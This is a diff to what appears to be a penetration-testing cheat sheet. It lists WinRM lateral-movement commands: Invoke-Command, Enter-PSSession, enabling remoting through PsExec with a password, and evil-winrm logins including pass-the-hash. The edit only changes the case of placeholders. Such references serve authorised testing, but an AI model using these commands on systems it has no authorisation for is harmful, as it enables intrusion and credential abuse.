@@ -25,25 +25,25 @@ Test-WSMan -computername <computername>
 ## Execute a command on the target over winrm (powershell)
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT   
 ```powershell
-Invoke-Command -computername <computername> -ScriptBlock {<cmd>} -credential <domain>\<username>
+Invoke-Command -computername <computername> -ScriptBlock {<cmd>} -credential <DOMAIN>\<username>
 ```
 
 ## Execute a script on the target over winrm (powershell)
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```powershell
-Invoke-Command -ComputerName <computername> -FilePath <path_to_script> -credential <domain>\<username>
+Invoke-Command -ComputerName <computername> -FilePath <path_to_script> -credential <DOMAIN>\<username>
 ```
 
 ## Get a powershell session with winrm (powershell)
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```powershell
-Enter-PSSession -ComputerName <computername> -Credential <domain>\<username>
+Enter-PSSession -ComputerName <computername> -Credential <DOMAIN>\<username>
 ```
 
 ## Enable winrm remotelly from psexec
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```batchfile
-.\PsExec.exe \\<computername> -u <domain>\<username> -p <password> -h -d powershell.exe 'enable-psremoting -force'  
+.\PsExec.exe \\<computername> -u <DOMAIN>\<username> -p <PASSWORD> -h -d powershell.exe 'enable-psremoting -force'  
 ```
 
 ## evil-winrm use
@@ -55,7 +55,7 @@ evil-winrm -i <IP> -u <username> -p pass
 ## evil-winrm use pass the hash
 #plateform/linux  #target/remote #cat/ATTACK/CONNECT 
 ```
-evil-winrm -i <IP> -u <username> -H <hash>
+evil-winrm -i <IP> -u <username> -H <HASH>
 ```
 
 ## evil-winrm Login with key
